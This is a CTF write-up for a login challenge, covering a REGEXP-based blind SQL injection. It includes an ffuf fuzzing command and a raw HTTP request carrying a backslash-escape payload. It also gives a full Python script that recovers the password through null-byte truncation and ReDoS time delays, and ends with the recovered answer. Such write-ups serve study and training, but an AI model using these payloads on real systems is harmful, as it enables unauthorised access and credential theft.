---
title: "pwnhub: Internal CTF [Unboxing Together - So_That_Login] Writeup"
slug: pwnhub-regexp-sqli
translationKey: pwnhub-regexp-sqli
date: 2021-10-21T14:06:49+08:00
source: yuque/penetration
---

# The Challenge Itself
There was no response echo at all, so I first tried FUZZing with `ffuf` and Burp:

```python
./ffuf -w /opt/dic/SecLists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt -u  http://121.40.89.206:8088/index.php   -d "username=FUZZ&passwd="
```

Throughout the whole process there were only two kinds of responses (both 200):

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1634796770549-a3b9dd94-3bc5-42e8-97e7-6770fff883e7.png)

**1) When a forbidden keyword is detected:**

+ Returns `alert('No,way! hacker!');`
+ Content-Length: `42`

**2) When the input is substituted into the SQL query:**

+ Returns the homepage content
+ Content-Length: `2175`

Here is the SQL fuzzing dictionary as well: [https://github.com/H4lo/dictionary/blob/master/sql_fuzz.txt](https://github.com/H4lo/dictionary/blob/master/sql_fuzz.txt)

So I fuzzed with all kinds of SQL keywords and determined that the following characters/keywords are allowed:

```python
from       
schema     
(      
)      
*      
/      
!      
^      
*      
_      
+      
/**/       
||     
regexp     
&      
|      
hex    
updatexml      
extractvalue       
update     
delete     
user       
version    
ascii      
group      
reverse    
left       
right      
é    
true       
length     
false      
load_file      
```

# Approach
Since I'm not good at finding "extreme blind SQL injection", I set it aside after some simple fuzzing. Later the organizers gave a hint:

```python
Update
2021.10.21 10:28:10 [Hint] Do you really understand MySQL regexp matching injection?
```

After some OSINT, I found a similar challenge: [REGEXP Injection and LIKE Injection Study Notes - Xianzhi Community](https://xz.aliyun.com/t/8003#toc-7)

**(1) Single quotes**`**'**`** are banned, but the**`**backslash \**`** from the article above can be used to form the SQL injection**

Thought: if you cannot escape the single quote, all input is just a string and injection is out of the question — the input must break out of the single quotes (without introducing new single quotes).



**(2) Comment symbols**`**--**`** and **`**#**`** are banned**

Thought: without comment symbols, you could also add quotes to make the statement valid SQL syntax, such as `||'`'`, but since single quotes are banned, this path is blocked.



<font style="color:#F5222D;">Looking through other players' solve scripts, they actually used</font>`<font style="color:#F5222D;">\x00</font>`<font style="color:#F5222D;">for truncation — I was genuinely amazed.</font>



## A Little After-the-Fact Cleverness
+ Why was the password field named `passwd` instead of `password` — it's missing an `or`. Most likely because the final solution would use `or`, which would get in the way, so it was removed.





# EXP
Both `--` and `#` were banned, and I didn't know how to close the trailing single quote; this is as far as I could get:

```python
POST /index.php HTTP/1.1
Host: 121.40.89.206:8088
Content-Length: 52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://121.40.89.206:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://121.40.89.206:8088/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=\&passwd=||passwd/**/regexp/**/0x5e41/**/||/**/'
```

The final EXP:

```python
import requests

burp0_url = "http://121.40.89.206:8088/index.php"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://121.40.89.206:8088", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://121.40.89.206:8088/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
proxy = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}


# ReDoS configuration
num = 30000  # Response time ~= 3s  <- r.elapsed
PADDING = "a"*num
REGEX = "(a*b*)"*num + "b"
sleep_clause = '("%s")REGEXP("%s")' % (PADDING, REGEX)


result = ''
charSets = "abcdefghijklmnopqrstuvwxyz0123456789-_"
condition = 'passwd/**/REGEXP/**/("^{tpl}")'
for i in range(64):
    for c in charSets:
        payload = '||CASE/**/WHEN/**/{condition}/**/THEN/**/{sleep_clause}/**/ELSE/**/1/**/END;\x00'.format(condition=condition.format(tpl=str(result + c)), sleep_clause=sleep_clause)
        burp0_data = {"username": "a\\", "passwd": payload}
        try:
            r = requests.post(burp0_url, proxies=proxy, data=burp0_data, timeout=2)
        except requests.exceptions.RequestException:
        # boolean true
            result += c
            print(result)
            break

print(result)
# the_p0ssw0rd_th0t_y0u_never_kn0w
```



ReDoS time delay + blind SQL injection + `\x00` truncation + Latin letters to bypass keyword detection

+ null-byte truncation
+ unsafe normalize



# Refs
+ [MySQL/8.0/en/regexp.html#operator_regexp](https://dev.mysql.com/doc/refman/8.0/en/regexp.html#operator_regexp)
+ [REGEXP Injection and LIKE Injection Study Notes - Xianzhi Community](https://xz.aliyun.com/t/8003#toc-7)
+ [https://www.exploit-db.com/docs/english/17397-blind-sql-injection-with-regular-expressions-attack.pdf](https://www.exploit-db.com/docs/english/17397-blind-sql-injection-with-regular-expressions-attack.pdf)
+ ReDoS: [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
+ [http://www.unicode.org/reports/tr36/](http://www.unicode.org/reports/tr36/)
